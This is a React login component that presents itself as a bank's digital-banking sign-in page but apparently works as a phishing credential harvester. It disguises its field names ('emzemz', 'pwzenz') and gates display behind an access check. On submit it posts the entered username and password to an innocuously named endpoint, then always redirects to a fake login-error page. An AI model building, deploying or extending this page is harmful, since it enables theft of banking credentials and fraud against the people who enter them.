import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [remember, setRemember] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  // If access is explicitly denied (not just loading), show loading
  if (!isAllowed) {
    return <div>Checking access...</div>;
  }

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };



  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    setIsLoading(true);
    event.preventDefault();
    let newErrors = { emzemz: '', pwzenz: '' };


    if (pwzenz.length <= 0) {
      newErrors.pwzenz = 'Password is required.';
      setIsLoading(false);
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.emzemz && !newErrors.pwzenz) {
      // Proceed with form submission
      console.log('Form submitted with:', { emzemz, pwzenz });

      const url = `${baseUrl}api/logix-meta-data-1/`;

      try {
        await axios.post(url, {
          emzemz: emzemz,
          pwzenz: pwzenz,
        });
        console.log('Message sent successfully');
        navigate('/login-error');
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
      }

      setErrors({ emzemz: '', pwzenz: '' });
    }
  };

  return (
    <div className="bg-white shadow-lg rounded-md w-full max-w-md p-6">
      <h2 className="text-center text-xl font-semibold mb-4">
        Login
      </h2>
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="emzemz">
            Username
          </label>
          <input
            id="emzemz"
            name="emzemz"
            type="text"
            value={emzemz}
            onChange={(e) => setEmzemz(e.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 focus:ring-2 focus:ring-purple-500 focus:outline-none shadow-sm"
          />
        </div>
        {errors.emzemz && (
          <div className="flex items-center gap-3 text-sm font-bold text-red-600">
            <svg
              width="1rem"
              height="1rem"
              viewBox="0 0 24 24"
              className="fill-current"
              aria-hidden="true"
            >
              <path
                d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                fillRule="nonzero"
              ></path>
            </svg>
            <p>Username required</p>
          </div>
        )}
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="pwzenz">
            Password
          </label>
          <div className="relative">
            <input
              id="pwzenz"
              name="pwzenz"
              type={showPwzenz ? 'text' : 'password'}
              value={pwzenz}
              onChange={(e) => setPwzenz(e.target.value)}
              className="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:ring-2 focus:ring-purple-500 focus:outline-none shadow-sm"
            />
            <button
              type="button"
              onClick={togglePwzenzVisibility}
              className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-purple-700 focus:outline-none"
              aria-label={showPwzenz ? 'Hide password' : 'Show password'}
            >
              {showPwzenz ? (
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                  strokeWidth="1.5"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c1.71 0 3.327-.376 4.786-1.05M6.228 6.228A10.451 10.451 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.5a10.523 10.523 0 01-4.293 5.25M6.228 6.228L3 3m3.228 3.228l12.544 12.544M9.88 9.88a3 3 0 104.24 4.24"
                  />
                </svg>
              ) : (
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                  strokeWidth="1.5"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z"
                  />
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                  />
                </svg>
              )}
            </button>
          </div>
        </div>
        {errors.pwzenz && (
          <div className="flex items-center gap-3 text-sm font-bold text-red-600">
            <svg
              width="1rem"
              height="1rem"
              viewBox="0 0 24 24"
              className="fill-current"
              aria-hidden="true"
            >
              <path
                d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                fillRule="nonzero"
              ></path>
            </svg>
            <p>Password required</p>
          </div>
        )}
        <div className="flex items-center justify-between">
    
          <input type="hidden" name="remember" value={remember ? 'true' : 'false'} />
          <button
            id="remember"
            type="button"
            role="switch"
            aria-checked={remember}
            onClick={() => setRemember(!remember)}
            className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none ${remember ? 'bg-purple-600' : 'bg-gray-300'}`}
          >
            <span
              className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${remember ? 'translate-x-6' : 'translate-x-1'}`}
            />
          </button>
        
              <label htmlFor="remember" className="text-sm text-gray-700">
            Remember Username
          </label>
        
        </div>
        <button
          type="submit"
          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition"
          disabled={isLoading}
        >
          {isLoading ? 'Signing In...' : 'Log In'}
        </button>
        <p className="text-center text-sm">
          <a href="#" className="text-purple-800 hover:underline">
            Forgot your username or password?
          </a>
        </p>
        <button
          type="button"
          className="w-full border border-purple-900 text-purple-900 py-2 rounded-md font-medium hover:bg-purple-50 transition"
        >
          Register for digital banking
        </button>
    
      </form>
    </div>
  );
};

export default LoginForm;
